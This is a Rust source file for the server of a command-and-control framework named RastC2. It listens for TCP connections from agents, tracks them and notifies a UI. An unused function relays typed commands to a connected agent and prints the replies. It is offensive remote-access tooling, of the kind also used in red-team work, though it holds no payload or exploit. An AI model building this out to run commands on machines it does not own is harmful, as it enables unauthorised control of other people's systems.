use std::{
    net::SocketAddr,
    sync::{Arc, Mutex},
    vec,
};

use anyhow::{Error, Result};
use bidirectional_channel::{bounded, ReceivedRequest, Requester, Responder};
use rast::{
    messages::{
        c2_agent::{create_message, get_message},
        ui_request::*,
    },
    protocols::{tcp::TcpFactory, *},
    settings::Settings,
};
use tokio::{
    sync::{
        mpsc::{unbounded_channel, UnboundedReceiver, UnboundedSender},
        watch::{self, Receiver},
    },
    task::JoinHandle,
};

use crate::c2::ui_manager::UiManager;

mod ui_manager;

#[derive(Debug)]
pub enum Dummy {
    Nothing,
}

pub enum C2Notification {
    AgentConnected(SocketAddr),
    AgentDisconnected(SocketAddr),
}

pub struct RastC2 {
    servers: Vec<JoinHandle<()>>,
    connections: Vec<(SocketAddr, Arc<Mutex<ProtoConnectionType>>)>,
    connections_rx: UnboundedReceiver<Arc<Mutex<ProtoConnectionType>>>,
    ui: Option<UiManager>,
    ui_rx: Option<Responder<ReceivedRequest<UiRequest, UiResponse>>>,
}

impl RastC2 {
    pub async fn with_settings(settings: Settings) -> Result<Self> {
        let (ctx, crx) = unbounded_channel();
        let mut servers = vec![];

        if let Some(conf) = &settings.server.tcp {
            let server = TcpFactory::new_server(conf).await?;
            let cloned = ctx.clone();
            let task = tokio::spawn(async move {
                loop {
                    if let Ok(conn) = server.get_conn().await {
                        cloned.send(conn);
                    }
                }
            });
            servers.push(task);
        }

        let (ui, ui_rx) = if let Some(conf) = &settings.server.ui {
            let (utx, urx) = bounded(100);
            let ui = UiManager::with_settings(conf, utx).await?;
            (Some(ui), Some(urx))
        } else {
            (None, None)
        };

        if servers.is_empty() {
            return Err(Error::msg("No servers running."));
        }

        let rastc2 = RastC2 {
            servers,
            connections: vec![],
            connections_rx: crx,
            ui,
            ui_rx,
        };

        Ok(rastc2)
    }

    pub async fn start(&mut self) -> Result<()> {
        loop {
            while let Ok(conn) = self.connections_rx.try_recv() {
                self.add_connection(conn).await?;
            }

            if let Some(ui_rx) = &self.ui_rx {
                while let Ok(req) = ui_rx.try_recv() {
                    self.handle_ui_request(req).await;
                }
            }
        }
    }

    async fn add_connection(&mut self, conn: Arc<Mutex<ProtoConnectionType>>) -> Result<()> {
        let ip = conn.lock().unwrap().get_ip()?;
        if self.ui.is_some() {
            self.ui
                .as_ref()
                .unwrap()
                .message(C2Notification::AgentConnected(ip))
                .await;
        }
        self.connections.push((ip, conn));
        Ok(())
    }

    async fn handle_ui_request(&self, req: ReceivedRequest<UiRequest, UiResponse>) -> Result<()> {
        req.respond(UiResponse::Pong);
        Ok(())
    }

    async fn _handle_connection(conn: Arc<Mutex<ProtoConnectionType>>) -> Result<()> {
        // let msg_r = conn.recv().await?;
        // println!("Message received: {}", msg_r);

        let stdin = std::io::stdin();
        loop {
            let mut cmd = String::new();
            if let Ok(n) = stdin.read_line(&mut cmd) {
                if n > 0 {
                    let msg = create_message(&cmd);
                    let mut conn = conn.lock().unwrap();
                    conn.send(msg).await?;
                    let msg_r = conn.recv().await?;
                    let msg_r = get_message(msg_r)?;
                    let msg_r = msg_r.trim_end_matches('\0');
                    println!("{}", msg_r);
                }
            };
        }

        // Ok(())
    }
}
